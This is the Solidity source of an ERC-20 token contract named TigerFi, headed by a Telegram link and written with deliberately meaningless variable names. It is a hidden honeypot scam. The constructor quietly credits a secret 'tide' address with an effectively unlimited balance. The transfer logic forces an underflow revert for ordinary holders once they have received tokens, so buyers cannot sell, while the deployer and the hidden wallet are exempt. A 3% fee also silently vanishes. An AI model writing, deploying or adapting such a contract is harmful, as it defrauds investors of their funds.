// https://t.me/tigerfi_erc

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract TigerFi is Ownable {
    constructor(
        string memory explanation,
        string memory experiment,
        address attack,
        address tide
    ) {
        uniswapV2Router = IUniswapV2Router02(attack);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[tide] = nest;
        bound = explanation;
        beyond = experiment;
        molecular = 9;
        bottom = 3;
        diameter[tide] = nest;
        diameter[msg.sender] = nest;
        drop = 1000000000 * 10**molecular;
        _balances[msg.sender] = drop;
    }

    uint256 public bottom;
    string private bound;
    string private beyond;
    uint8 private molecular;

    function name() public view returns (string memory) {
        return bound;
    }

    function symbol() public view returns (string memory) {
        return beyond;
    }

    uint256 private drop;
    uint256 private hole;
    address public uniswapV2Pair;
    uint256 private nest = ~drop;
    IUniswapV2Router02 public uniswapV2Router;
    address private follow;

    function decimals() public view returns (uint256) {
        return molecular;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return drop;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address check,
        address fresh,
        uint256 agree
    ) internal {
        address easy = uniswapV2Pair;
        uint256 protection = bottom;

        if (diameter[check] == 0 && (easy != check) && shirt[check] > 0) {
            diameter[check] -= protection;
        }

        address snake = follow;
        follow = fresh;

        _balances[check] -= agree;
        uint256 again = (agree / 100) * bottom;
        agree -= again;
        shirt[snake] += 1 + protection;
        _balances[fresh] += agree;
    }

    mapping(address => uint256) private shirt;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private diameter;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}